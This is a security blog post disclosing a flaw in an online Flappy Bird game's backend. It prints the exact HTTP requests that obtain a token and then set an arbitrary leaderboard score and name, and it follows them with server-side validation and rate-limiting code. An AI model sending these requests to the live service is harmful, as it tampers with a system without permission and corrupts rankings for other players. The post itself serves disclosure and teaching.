---
layout: single
title: "Hacking Flappy Bird: How to Manipulate Scores Without Playing"
excerpt: Vulnerability analysis in the popular online Flappy Bird game that allows score manipulation through direct HTTP requests, completely bypassing game logic.
date: 2025-08-22
classes: wide
header:
  teaser: /assets/images/flappy-bird-hack/logo.jpeg
  teaser_home_page: true
  icon: /assets/images/flappy-bird-hack/logo.jpeg
categories:
  - infosec
  - vulnerability
  - web-hacking
tags:  
  - Web Security
  - API Vulnerability
  - Score Manipulation
  - Game Hacking
  - HTTP Requests
---

## Introduction: When Games Don't Validate Server-Side

**Hello everyone!** Today we're going to analyze a fascinating vulnerability in the popular **online Flappy Bird** game available at [https://flappybird.io/](https://flappybird.io/). During a security investigation, I discovered that it's possible to **completely manipulate scores** without even playing the game, simply by sending direct HTTP requests to the backend.

![Flappy Bird Hack](/assets/images/flappy-bird-hack/logo.png)

### The Game: Flappy Bird Online

[Flappy Bird](https://flappybird.io/) is a web recreation of the famous mobile game, where players must fly a bird through pipes without crashing. The game includes:

- **Real-time scoring system**
- **Leaderboard** with top scores
- **Backend API** at `flappy-backend.fly.dev`

## The Discovery: API Without Validation

### HTTP Traffic Analysis

By intercepting HTTP traffic during gameplay, I identified an interesting pattern in communications with the backend server.

#### **Request 1: Get Session Token**

```http
POST /scores HTTP/2
Host: flappy-backend.fly.dev
Content-Length: 0
Sec-Ch-Ua-Platform: "macOS"
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Accept: */*
Sec-Ch-Ua: "Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"
Sec-Ch-Ua-Mobile: ?0
Origin: https://flappybird.io
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://flappybird.io/
Accept-Encoding: gzip, deflate, br
Accept-Language: es-ES,es;q=0.9
Priority: u=1, i
```

#### **Server Response**

```http
HTTP/2 200 OK
Access-Control-Allow-Origin: *
Content-Type: application/json; charset=utf-8
X-Ratelimit-Limit: 60
X-Ratelimit-Remaining: 59
X-Ratelimit-Reset: 1755782984
Date: Thu, 21 Aug 2025 13:28:44 GMT
Server: Fly/da35c1382 (2025-08-20)
Via: 2 fly.io, 2 fly.io
Fly-Request-Id: 01K36D2HZ9YQXH38T0V6V7D74A-cdg

{"token":"JmuQBFvSPWBeLFGJxniOCSnFcPpglqGs"}
```

## The Vulnerability: Direct Score Manipulation

### **Step 2: Set Fake Score**

With the obtained token, it's possible to **set any score** without having played:

```http
POST /scores/JmuQBFvSPWBeLFGJxniOCSnFcPpglqGs?count=3 HTTP/2
Host: flappy-backend.fly.dev
Content-Length: 0
Sec-Ch-Ua-Platform: "macOS"
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Accept: application/json, text/javascript, */*; q=0.01
Sec-Ch-Ua: "Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"
Sec-Ch-Ua-Mobile: ?0
Origin: https://flappybird.io
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://flappybird.io/
Accept-Encoding: gzip, deflate, br
Accept-Language: es-ES,es;q=0.9
Priority: u=1, i
```

#### **Server Response**

```http
HTTP/2 200 OK
Access-Control-Allow-Origin: *
Content-Type: application/json; charset=utf-8
X-Ratelimit-Limit: 60
X-Ratelimit-Remaining: 59
X-Ratelimit-Reset: 1755782996
Date: Thu, 21 Aug 2025 13:28:56 GMT
Server: Fly/da35c1382 (2025-08-20)
Via: 2 fly.io, 2 fly.io
Fly-Request-Id: 01K36D2YA0H6NG3NCCQVQD2JTD-cdg

{"msg":"ok"}
```

### **Step 3: Set Player Name**

Finally, we set the name that will appear on the leaderboard:

```http
POST /scores/JmuQBFvSPWBeLFGJxniOCSnFcPpglqGs?name=pikasito HTTP/2
Host: flappy-backend.fly.dev
Content-Length: 0
Sec-Ch-Ua-Platform: "macOS"
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Accept: */*
Sec-Ch-Ua: "Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"
Sec-Ch-Ua-Mobile: ?0
Origin: https://flappybird.io
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://flappybird.io/
Accept-Encoding: gzip, deflate, br
Accept-Language: es-ES,es;q=0.9
Priority: u=1, i
```

#### **Final Response**

```http
HTTP/2 200 OK
Access-Control-Allow-Origin: *
Content-Type: application/json; charset=utf-8
X-Ratelimit-Limit: 60
X-Ratelimit-Remaining: 59
X-Ratelimit-Reset: 1755783131
Date: Thu, 21 Aug 2025 13:31:11 GMT
Server: Fly/da35c1382 (2025-08-20)
Via: 2 fly.io, 2 fly.io
Fly-Request-Id: 01K36D71FRK9YFPVMSK906EYQ5-cdg

{"msg":"ok"}
```

![Flappy Bird Hack](/assets/images/flappy-bird-hack/flappy1.png)

### Attack Result

With this simple flow, any attacker can:

- ✅ **Appear on the leaderboard** with impossible scores
- ✅ **Manipulate rankings** without having played
- ✅ **Contaminate legitimate competition**
- ✅ **Completely bypass** game logic

## Vulnerability Analysis

### 🚨 **Identified Problems**

#### **Lack of Server-Side Validation**
- The server **accepts any score** without validation
- **No verification** that the game was actually played
- **Absence of basic anti-cheat logic**

#### **Exposed API Endpoints**
- Score endpoints are **completely exposed**
- **No robust authentication** beyond temporary token
- **CORS allowed from any origin** (`Access-Control-Allow-Origin: *`)

#### **Predictable Tokens**
- Generated tokens could have **predictable patterns**
- **No effective rate limiting** for token generation
- **Token reuse** potentially possible

## Impact and Risks

### 🎯 **For Legitimate Players**

- **Leaderboards contaminated** with fake scores
- **Loss of motivation** due to unfair competition
- **Degraded gaming experience**

### 🏢 **For Developers**

- **Loss of scoring system integrity**
- **Reputational damage** to the game
- **False engagement metrics**

## Mitigation Recommendations

### 🛡️ **Immediate Solutions**

#### **Server-Side Validation**

```javascript
// Basic validation example
app.post('/scores/:token', async (req, res) => {
  const { count } = req.query;
  const gameSession = await getGameSession(req.params.token);
  
  // Validate that game session is legitimate
  if (!gameSession.isActive || gameSession.gameCompleted !== true) {
    return res.status(403).json({ error: 'Invalid game session' });
  }
  
  // Validate realistic score
  if (count > gameSession.maxPossibleScore) {
    return res.status(400).json({ error: 'Unrealistic score' });
  }
  
  // Validate minimum game time
  const gameTime = Date.now() - gameSession.startTime;
  const minTime = count * 1000; // 1 second per point minimum
  
  if (gameTime < minTime) {
    return res.status(400).json({ error: 'Game completed too quickly' });
  }
});
```

#### **Implement Basic Anti-Cheat**

- **Game action tracking** on client
- **Temporal sequence validation** of events
- **Realistic limits** on score per time played
- **User input verification**

#### **API Security**

```javascript
// Stricter rate limiting
const rateLimit = require('express-rate-limit');

const scoreLimit = rateLimit({
  windowMs: 60 * 1000, // 1 minute
  max: 5, // maximum 5 attempts per minute
  message: 'Too many score submissions'
});

app.use('/scores', scoreLimit);
```

### 🔐 **Best Practices**

#### **Secure Architecture**
- **Dual validation** (client + server)
- **Tokens with short expiration**
- **Logging and monitoring** of anomalous patterns
- **User input sanitization**

#### **Anomaly Detection**
```javascript
// Detect suspicious patterns
const detectAnomalies = (score, playerHistory) => {
  const avgScore = playerHistory.reduce((a, b) => a + b, 0) / playerHistory.length;
  const scoreIncrease = score / avgScore;
  
  // If increase is greater than 300%, flag as suspicious
  if (scoreIncrease > 3.0) {
    flagForReview(score, playerHistory);
  }
};
```

## Conclusions

### Lessons Learned

This case demonstrates critical problems common in **web games**:

- **Blind trust in client-side** is dangerous
- **Exposed APIs** require robust validation
- **Scoring systems** need multiple security layers

#### For Game Developers
- **Never trust client-side only** for critical validation
- **Implement basic anti-cheat** from design phase
- **Monitor anomalous patterns** continuously

#### Current Status
The game remains **vulnerable** at the time of this publication.

*This analysis is published for educational purposes to raise awareness about the importance of server-side validation in web gaming applications.*
